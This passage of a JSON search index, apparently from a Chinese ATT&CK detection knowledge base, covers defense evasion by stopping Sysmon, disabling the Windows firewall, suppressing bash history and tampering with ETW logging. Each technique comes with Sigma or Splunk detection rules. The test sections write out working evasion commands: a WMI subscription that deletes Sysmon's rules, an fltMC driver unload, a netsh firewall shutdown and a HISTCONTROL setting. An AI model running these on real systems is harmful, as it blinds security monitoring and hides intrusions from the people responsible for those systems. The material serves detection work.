-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#1","title":"\u5220\u9664\u914d\u7f6e\u98791","text":"<pre><code>$query = \"SELECT * FROM RegistryKeyChangeEvent \" +\n    \"WHERE Hive ='HKEY_LOCAL_MACHINE' \" +\n    \"AND KeyPath ='SYSTEM\\\\CurrentControlSet\\\\Services\\\\SysmonDrv\\\\Parameters'\"\n\nRegister-WMIEvent -Query $query -Action {\n    Write-host \"Sysmon config updated, deleting config.\"\n    Remove-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SysmonDrv\\Parameters\" -Name \"Rules\" }\n</code></pre> <p>\u9700\u8981\u6ce8\u610f\u4e00\u70b9\uff0c\u6b64\u65f6Sysmon\u4f1a\u6062\u590d\u9ed8\u8ba4\u914d\u7f6e\uff0c\u56e0\u6b64\u4f1a\u8bb0\u5f55\u8fdb\u7a0b\u521b\u5efa\u548c\u8fdb\u7a0b\u7ec8\u6b62\u4e8b\u4ef6\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#sysmondrv1","title":"\u5378\u8f7dSysmonDrv\u9a71\u52a81","text":"<pre><code>Windows PowerShell\n\u7248\u6743\u6240\u6709 (C) 2009 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\n\nPS C:\\Users\\Administrator&gt; fltMC.exe\n\n\u7b5b\u9009\u5668\u540d\u79f0                      \u6570\u5b57\u5b9e\u4f8b       \u9ad8\u5ea6          \u6846\u67b6\n------------------------------  -------------  ------------  -----\nSysmonDrv                               2       385201         0\nluafv                                   1       135000         0\nPS C:\\Users\\Administrator&gt; fltMC.exe unload SysmonDrv\nPS C:\\Users\\Administrator&gt; fltMC.exe\n\n\u7b5b\u9009\u5668\u540d\u79f0                      \u6570\u5b57\u5b9e\u4f8b       \u9ad8\u5ea6          \u6846\u67b6\n------------------------------  -------------  ------------  -----\nluafv                                   1       135000         0\nPS C:\\Users\\Administrator&gt;\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#sysmon_2","title":"\u5173\u95edsysmon\u670d\u52a1","text":"<p>\u4efb\u52a1\u7ba1\u7406\u5668&gt;\u670d\u52a1&gt;sysmon\u670d\u52a1&gt;\u505c\u6b62</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#_5","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#_6","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#sigma","title":"sigma\u89c4\u5219","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#2","title":"\u5220\u9664\u914d\u7f6e\u98792","text":"<pre><code>title: \u5220\u9664sysmon\u914d\u7f6e\u9879\ndescription: win7 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: WMI\u65e5\u5fd7\ndetection:\n    selection:\n        EventID: 5860\n        keyword: '\u547d\u540d\u7a7a\u95f4 = root\\cimv2\uff1bNotificationQuery = SELECT * FROM RegistryKeyChangeEvent WHERE Hive ='HKEY_LOCAL_MACHINE' AND KeyPath ='SYSTEM\\\\CurrentControlSet\\\\Services\\\\SysmonDrv\\\\Parameters'\uff1bPossibleCause = Temporary'\n    timeframe: last 1m\n    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#sysmondrvsysmon","title":"\u5378\u8f7dSysmonDrv\u9a71\u52a8\u2014sysmon","text":"<pre><code>title: fltmc\u5378\u8f7dsysmon\ndescription: windows server 2008 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection1:\n        EventID: 1\n        Image: 'C:\\Windows\\SysWOW64\\fltMC.exe'\n        CommandLine: '\"C:\\Windows\\system32\\fltMC.exe\"  unload Sysmon*'\n        ParentImage: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\n    selection2:\n        EventID: 255\n        ID: 'DriverCommunication'\n        Description: 'Failed to retrieve events - Last error: \u7531\u4e8e\u7ebf\u7a0b\u9000\u51fa\u6216\u5e94\u7528\u7a0b\u5e8f\u8bf7\u6c42\uff0c\u5df2\u4e2d\u6b62 I/O \u64cd\u4f5c\u3002'\n    timeframe: last 1m\n    condition: all of them\nlevel: medium\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#sysmon2","title":"\u5173\u95edsysmon\u670d\u52a12","text":"<pre><code>title: \u4ee5\u5176\u4ed6\u65b9\u5f0f\u5173\u95edsysmon\u670d\u52a1\ndescription: win7 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: system\u3001sysmon\ndetection:\n    selection1:\n        EventID: 4 #sysmon\u65e5\u5fd7\n        State: Stopped\n    selection2: 7036 #system\u65e5\u5fd7\n        keyword: 'Sysmon* \u670d\u52a1\u5904\u4e8e \u505c\u6b62 \u72b6\u6001\u3002'\n    selection3: 7040  #system\u65e5\u5fd7\n        keyword: 'Sysmon64 \u670d\u52a1\u7684\u542f\u52a8\u7c7b\u578b\u4ece \u81ea\u52a8\u542f\u52a8 \u66f4\u6539\u4e3a \u5df2\u7981\u7528\u3002'\n    selection4: 7034 #system\n    condition: selection or selection2 or selection3 or selection4\nlevel: medium\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#_7","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2sysmon%E6%9C%8D%E5%8A%A1/#_8","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1562-001</p> <p>https://attack.mitre.org/techniques/T1562/001/</p> <p>\u5ba1\u6838\u7b56\u7565\u76f8\u5173\u4ecb\u7ecd</p> <p>https://www.malwarearchaeology.com/logging</p> <p>\u5982\u4f55\u89c4\u907fsysmon</p> <p>https://www.anquanke.com/post/id/161630</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/","title":"T1562-001-windows-\u505c\u6b62Windows\u9632\u5fa1\u670d\u52a1","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u963b\u6b62\u7531\u76d1\u6d4b\u8f6f\u4ef6\u6216\u8fdb\u7a0b\u6355\u83b7\u5230\u7684\u544a\u8b66\uff0c\u4ee5\u53ca\u4e8b\u4ef6\u65e5\u5fd7\u88ab\u6536\u96c6\u548c\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u914d\u7f6e\u6587\u4ef6\u6216\u6ce8\u518c\u8868\u9879\u4e2d\u7684\u76d1\u6d4b\u8f6f\u4ef6\u7684\u8bbe\u7f6e\uff0c\u4ee5\u8fbe\u5230\u9003\u907f\u8ffd\u8e2a\u7684\u76ee\u7684\u3002</p> <p>\u95f4\u8c0d\u8f6f\u4ef6\u548c\u6076\u610f\u8f6f\u4ef6\u4ecd\u7136\u662f\u4e00\u4e2a\u4e25\u91cd\u7684\u95ee\u9898\uff0c\u5fae\u8f6f\u5f00\u53d1\u4e86\u5b89\u5168\u670d\u52a1\u5373Windows Defender\u548cWindows\u9632\u706b\u5899\uff0c\u534f\u52a9\u7528\u6237\u5bf9\u6297\u8fd9\u79cd\u5a01\u80c1\u3002\u5982\u679c\u5173\u95edWindows Defender\u6216Windows\u9632\u706b\u5899\uff0c\u5e94\u5f53\u5f15\u8d77\u7ba1\u7406\u5458\u7684\u6ce8\u610f\uff0c\u7acb\u5373\u6062\u590dwindows Defender\u6216windows\u9632\u706b\u5899\uff0c\u4f7f\u5176\u5904\u4e8e\u6b63\u5e38\u5de5\u4f5c\u72b6\u6001\uff0c\u8c03\u67e5\u5e76\u786e\u5b9a\u5f02\u5e38\u60c5\u51b5\u662f\u5426\u7531\u7528\u6237\u6b63\u5e38\u64cd\u4f5c\u5f15\u8d77\u7684\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>windows 7</p> <p>DOS\u547d\u4ee4\u5173\u95edwindows\u9632\u706b\u5899\uff1anetsh advfilewall set publicprofile state off</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows system</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>windows\u5173\u95ed\u9632\u706b\u5899\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u4f46\u4e8b\u4ef6ID\u53ea\u6709\u4e00\u4e2a\u3002</p> <ul> <li>net start mpssvc</li> <li>netsh advfilewall set publicprofile state off</li> </ul>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows system\u4e8b\u4ef6ID7036</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u505c\u6b62Windows\u9632\u5fa1\u670d\u52a1\ndescription: win7 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n\u200b    product: windows\n\u200b    service: system\ndetection:\n\u200b    selection:\n\u200b        EventID: 7036\n\u200b        Message: 'Windows Firewall \u670d\u52a1\u5904\u4e8e \u505c\u6b62 \u72b6\u6001\u3002'\n\u200b    condition: selection\nlevel: medium\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-001-win-%E5%81%9C%E6%AD%A2windows%E9%98%B2%E5%BE%A1%E6%9C%8D%E5%8A%A1/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1562-001</p> <p>https://attack.mitre.org/techniques/T1562/001/</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/","title":"T1562-003-linux-Histcontrol","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u5728HISTCONTROL\u73af\u5883\u53d8\u91cf\u51b3\u5b9a\u4e86\u662f\u5426\u4fdd\u5b58history\u547d\u4ee4\uff0c\u5e76\u6700\u7ec8\u8fdb\u5165~/.bash_history\u7528\u6237\u767b\u5f55\u65f6\u51fa\u7684\u6587\u4ef6\u3002\u53ef\u4ee5\u5c06\u6b64\u8bbe\u7f6e\u914d\u7f6e\u4e3a\u5ffd\u7565\u4ee5\u7a7a\u683c\u5f00\u5934\u7684\u547d\u4ee4\uff0c\u53ea\u9700\u5c06\u5176\u8bbe\u7f6e\u4e3a\u201cignorespace\u201d\u5373\u53ef\u3002HISTCONTROL\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u5ffd\u7565\u91cd\u590d\u547d\u4ee4\uff0c\u5176\u4f7f\u7528\u65b9\u6cd5\u662f\u5c06\u5176\u8bbe\u7f6e\u4e3a\u201cignoredups\u201d\u3002\u5728\u67d0\u4e9bLinux\u7cfb\u7edf\u4e2d\uff0c\u9ed8\u8ba4\u8bbe\u7f6e\u4e3a\u201cignoreboth\u201d\uff0c\u5b83\u6db5\u76d6\u4e86\u524d\u9762\u7684\u4e24\u4e2a\u793a\u4f8b\u3002\u8fd9\u610f\u5473\u7740\u201cls\u201d\u5c06\u4e0d\u4f1a\u88ab\u4fdd\u5b58\uff0c\u4f46\u201cls\u201d\u5c06\u88ab\u5386\u53f2\u4fdd\u5b58\u3002HISTCONTROL\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u5728macOS\u4e0a\u4e0d\u5b58\u5728\uff0c\u4f46\u53ef\u4ee5\u7531\u7528\u6237\u8bbe\u7f6e\u5e76\u4e14\u5c06\u53d7\u5230\u4fdd\u62a4\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u7b80\u5355\u7684\u5728\u5176\u6240\u6709\u7ec8\u7aef\u547d\u4ee4\u4e4b\u524d\u6dfb\u52a0\u7a7a\u683c\u6765\u4f7f\u7528\u5b83\u8fdb\u884c\u64cd\u4f5c\u64cd\u4f5c\u800c\u4e0d\u7559\u4e0b\u75d5\u8ff9\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>export HISTCONTROL=ignoreboth</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>bash\u5386\u53f2\u8bb0\u5f55</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>icbc@icbc:/$ ls</p> <p>icbc@icbc:/$ history     1  ls</p> <p>icbc@icbc:/$ export HISTCONTROL=ignoreboth icbc@icbc:/$  ls</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>icbc@icbc:/$ history     1  ls     2  export HISTCONTROL=ignoreboth     3  history</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#splunk","title":"splunk\u89c4\u5219","text":"<p>index=linux sourcetype=\"bash_history\" export HISTCONTROL | table host, user_name, bash_command</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-003-linux-Histcontrol/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1562-003</p> <p>https://attack.mitre.org/techniques/T1562/003/</p> <p>linux history\u547d\u4ee4\u8be6\u89e3</p> <p>https://www.cnblogs.com/keithtt/p/7040549.html</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/","title":"T1562-006-windows-\u505c\u6b62\u65e5\u5fd7\u91c7\u96c6","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u963b\u6b62\u901a\u5e38\u7531\u4f20\u611f\u5668\uff08\u53ef\u7406\u89e3\u4e3awindows\u65e5\u5fd7\u5ba1\u6838\u7b56\u7565\uff09\u6355\u83b7\u7684\u6307\u6807\uff08\u53ef\u7406\u89e3\u4e3a\u544a\u8b66\uff09\u6216\u4e8b\u4ef6\u88ab\u6536\u96c6\u548c\u5206\u6790\u3002\u8fd9\u53ef\u80fd\u5305\u62ec\u6076\u610f\u7be1\u6539\u6216\u901a\u8fc7\u7be1\u6539\u63a7\u5236\u4e8b\u4ef6\u9065\u6d4b\u6536\u96c6\u548c\u6d41\u7a0b\u7684\u8bbe\u7f6e\u6765\u7981\u7528\u57fa\u4e8e\u4e3b\u673a\u7684\u4f20\u611f\u5668\uff0c\u4f8b\u5982Windows\u4e8b\u4ef6\u8ddf\u8e2a\uff08ETW\uff09\u3002 \u8fd9\u4e9b\u8bbe\u7f6e\u53ef\u4ee5\u5b58\u50a8\u5728\u7cfb\u7edf\u4e2d\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u6216\u6ce8\u518c\u8868\u4e2d\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u7ba1\u7406\u5b9e\u7528\u7a0b\u5e8f\uff08\u4f8b\u5982PowerShell\u6216Windows Management Instrumentation\uff09\u8fdb\u884c\u8bbf\u95ee\u3002</p> <p>\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u5b9e\u73b0ETW\u4e2d\u65ad\uff0c\u4f46\u662f\u6700\u76f4\u63a5\u7684\u65b9\u6cd5\u662f\u4f7f\u7528PowerShell Set-EtwTraceProvider cmdlet\u5b9a\u4e49\u6761\u4ef6\uff0c\u6216\u8005\u76f4\u63a5\u5bf9\u6ce8\u518c\u8868\u8fdb\u884c\u66f4\u6539\u3002</p> <p>\u5728\u57fa\u4e8e\u7f51\u7edc\u7684\u6307\u6807\u62a5\u544a\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u963b\u6b62\u4e0e\u62a5\u544a\u76f8\u5173\u7684\u6d41\u91cf\uff0c\u4ee5\u9632\u6b62\u8fdb\u884c\u96c6\u4e2d\u5206\u6790\u3002\u8fd9\u53ef\u4ee5\u901a\u8fc7\u591a\u79cd\u65b9\u5f0f\u6765\u5b8c\u6210\uff0c\u4f8b\u5982\u505c\u6b62\u8d1f\u8d23\u8f6c\u53d1\u6570\u636e\u7684\u672c\u5730\u8fdb\u7a0b\u6216\u521b\u5efa\u57fa\u4e8e\u4e3b\u673a\u7684\u9632\u706b\u5899\u89c4\u5219\u4ee5\u963b\u6b62\u6d41\u91cf\u6d41\u5411\u8d1f\u8d23\u6c47\u603b\u4e8b\u4ef6\u7684\u7279\u5b9a\u4e3b\u673a\uff0c\u4f8b\u5982\u5b89\u5168\u4fe1\u606f\u548c\u4e8b\u4ef6\u7ba1\u7406\uff08SIEM\uff09\u4ea7\u54c1\u3002</p> <p>\u6ce8\u91ca\uff1aETW\u662fEvent Tracing for Windows\u7684\u7b80\u79f0\uff0c\u5b83\u662fWindows\u63d0\u4f9b\u7684\u539f\u751f\u7684\u4e8b\u4ef6\u8ddf\u8e2a\u65e5\u5fd7\u7cfb\u7edf\u3002\u7531\u4e8e\u91c7\u7528\u5185\u6838\uff08Kernel\uff09\u5c42\u9762\u7684\u7f13\u51b2\u548c\u65e5\u5fd7\u8bb0\u5f55\u673a\u5236\uff0c\u6240\u4ee5ETW\u63d0\u4f9b\u4e86\u4e00\u79cd\u975e\u5e38\u9ad8\u6548\u7684\u4e8b\u4ef6\u8ddf\u8e2a\u65e5\u5fd7\u89e3\u51b3\u65b9\u6848\u3002</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6682\u65e0\u6d4b\u8bd5\u6848\u4f8b\uff0c\u53ef\u53c2\u8003\u5176\u4ed6\u6848\u4f8b\uff0c\u5173\u505c\u65e5\u5fd7\u8f6c\u53d1\u6216\u66f4\u6539\u65e5\u5fd7\u91c7\u96c6\u7b56\u7565</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows sysmon</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u6682\u65e0\u6d4b\u8bd5\u6848\u4f8b\uff0c\u53ef\u53c2\u8003\u5176\u4ed6\u6848\u4f8b\uff0c\u5173\u505c\u65e5\u5fd7\u8f6c\u53d1\u6216\u66f4\u6539\u65e5\u5fd7\u91c7\u96c6\u7b56\u7565</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows sysmon</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#splunk","title":"splunk\u89c4\u5219","text":"<p>\u4ece\u4e3b\u673a\u65e5\u5fd7\u8f6c\u53d1\u5668\u68c0\u6d4b\u5230\u7f3a\u5c11\u544a\u8b66\u6216\u8005\u65e5\u5fd7\u7684\u6d3b\u52a8\u3002\u4e0d\u540c\u7684\u963b\u6b62\u65b9\u6cd5\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6293\u53d1\u4e2d\u65ad\u3002\u7cfb\u7edf\u53ef\u80fd\u7a81\u7136\u505c\u6b62\u62a5\u544a\u6240\u6709\u6570\u636e\u6216\u4ec5\u62a5\u544a\u67d0\u4e9b\u79cd\u7c7b\u7684\u6570\u636e\u3002</p> <p>\u6839\u636e\u6536\u96c6\u5230\u7684\u4e3b\u673a\u4fe1\u606f\u7684\u7c7b\u578b\uff0c\u5206\u6790\u4eba\u5458\u53ef\u80fd\u80fd\u591f\u68c0\u6d4b\u5230\u89e6\u53d1\u4e86\u8fdb\u7a0b\u505c\u6b62\u6216\u8fde\u63a5\u88ab\u963b\u6b62\u7684\u4e8b\u4ef6\u3002\u4f8b\u5982\uff0cSysmon\u5c06\u5728\u5176\u914d\u7f6e\u72b6\u6001\u5df2\u66f4\u6539\uff08\u4e8b\u4ef6ID 16\uff09\u65f6\u8fdb\u884c\u8bb0\u5f55\uff0c\u5e76\u4e14Windows Management Instrumentation\uff08WMI\uff09\u53ef\u4ee5\u7528\u4e8e\u8ba2\u9605ETW\u63d0\u4f9b\u7a0b\u5e8f\uff0c\u8be5\u7a0b\u5e8f\u8bb0\u5f55\u4ece\u7279\u5b9a\u8ddf\u8e2a\u4f1a\u8bdd\u4e2d\u5220\u9664\u7684\u4efb\u4f55\u63d0\u4f9b\u7a0b\u5e8f\u3002\u8981\u68c0\u6d4bETW\u4e2d\u7684\u66f4\u6539\uff0c\u60a8\u8fd8\u53ef\u4ee5\u76d1\u89c6\u5305\u542b\u6240\u6709ETW\u4e8b\u4ef6\u63d0\u4f9b\u7a0b\u5e8f\u914d\u7f6e\u7684\u6ce8\u518c\u8868\u9879\uff1aHKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\ Autologger\\AUTOLOGGER_NAME {{PROVIDER_GUID}}</p> <pre><code>index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d  (EventCode=16) OR (EventCode IN (12,13) TargetObject=\u201cHKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\WMI\\\\Autologger*\u201d) OR (EventCode=1 Image=\u201d*\\\\logman.exe\u201d CommandLine=\u201d*update trace*\u201d) OR (EventCode=1 Image=\u201d*\\\\wpr\u201d)//tampering Event Tracing in windows\n</code></pre> <pre><code> index=windows source=\u201dWinEventLog:Microsoft-Windows-Sysmon/Operational\u201d (EventCode=1   Image=\u201d*\\\\logman.exe\u201d CommandLine=\u201d*query*\u201d) OR (EventCode IN (12,13) TargetObject=\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Publishers*\u201d) // enumirating the ETW in windows with logman,exe\n</code></pre>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1562-006-win-%E5%81%9C%E6%AD%A2%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1562-006</p> <p>https://attack.mitre.org/techniques/T1562/006/</p> <p>\u5982\u4f55\u5229\u7528ETW\uff08Event Tracing for Windows\uff09\u8bb0\u5f55\u65e5\u5fd7</p> <p>https://www.cnblogs.com/artech/p/logging-via-etw.html</p>"},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/","title":"T1564-001-linux-\u9690\u85cf\u6587\u4ef6\u548c\u76ee\u5f55","text":""},{"location":"0x7_%E9%80%83%E9%81%BF%E8%BF%BD%E8%B8%AA/T1564-001-linux-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E5%92%8C%E7%9B%AE%E5%BD%95/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u4e3a\u4e86\u9632\u6b62\u666e\u901a\u7528\u6237\u8bef\u64cd\u4f5c\u66f4\u6539\u7cfb\u7edf\u4e0a\u7684\u7279\u6b8a\u6587\u4ef6\uff0c\u5927\u591a\u6570\u64cd\u4f5c\u7cfb\u7edf\u90fd\u5177\u6709\u201c\u9690\u85cf\u201d\u6587\u4ef6\u7684\u6982\u5ff5\u3002\u5f53\u7528\u6237\u4f7f\u7528GUI\u6d4f\u89c8\u6587\u4ef6\u7cfb\u7edf\u6216\u5728\u547d\u4ee4\u884c\u4e0a\u4f7f\u7528\u666e\u901a\u547d\u4ee4\u65f6\uff0c\u8fd9\u4e9b\u6587\u4ef6\u4e0d\u4f1a\u663e\u793a\u3